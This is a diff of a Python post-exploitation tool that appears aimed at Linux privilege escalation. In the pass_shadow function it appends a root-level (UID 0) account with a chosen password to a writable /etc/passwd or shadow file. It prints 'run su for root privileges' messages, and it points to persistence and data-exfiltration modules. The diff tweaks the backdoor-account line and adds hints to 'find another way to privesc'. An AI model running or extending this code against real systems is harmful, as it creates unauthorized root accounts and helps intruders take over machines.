@@ -464,10 +464,12 @@ def pass_shadow(username,password):
       if writable:
          os.system("echo ''")
          print("\n###!!! /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
-         os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
+         os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
          print("\n###!!! root user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
          os.system("echo ''")
          os.system("echo '###!!! root user {}:{} created... run *su {}* for root privileges ###' > /tmp/passwd_res.txt".format(username,password,username))
+         os.system("echo ''")
+         os.system("<> newer systems may prevent unprivileged users from adding new users to system <>\n<> if you cannot login to newly created user, you will need to find another way to privesc <>")
          os.system("echo ''")
       else:
          os.system("echo ''")
@@ -485,6 +487,8 @@ def pass_shadow(username,password):
          print("\n###!!! root user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
          os.system("echo ''")
          os.system("echo '###!!! root user {}:{} created... run *su {}* for root privileges ###' > /tmp/shad_res.txt".format(username,password,username))
+         os.system("echo ''")
+         os.system("<> newer systems may prevent unprivileged users from adding new users to system <>\n<> if you cannot login to newly created user, you will need to find another way to privesc <>")
          os.system("echo ''")
       else:
          os.system("echo ''")
@@ -506,18 +510,8 @@ def pass_shadow(username,password):
    os.system("cat /tmp/path_res.txt >> /tmp/print.txt 2>/dev/null")
    os.system("cat /tmp/passwd_res.txt >> /tmp/print.txt 2>/dev/null")
    os.system("cat /tmp/shad_res.txt >> /tmp/print.txt 2>/dev/null")
-   os.system("cat /tmp/print.txt")
 
-
-# check for root
-def root_check():
-   os.system("id > /tmp/check.txt")
-   with open("/tmp/check.txt") as check:
-      read_check = check.readline()
-      if "root" in read_check:
-         print("\n-+- welcome, root -+-")
-      else:
-         print("\n-+- run 'whoami' to check if you are root user -+-")
+   print("-- see /tmp/print.txt for more details --")
 
 
 # persistence ###############################
@@ -878,7 +872,6 @@ elif module == "priv":
    suid()
    path()
    pass_shadow(username,password)
-   root_check()
 elif module == "root":
    # call persistence and data exfil functions
    is_root = perm_check()
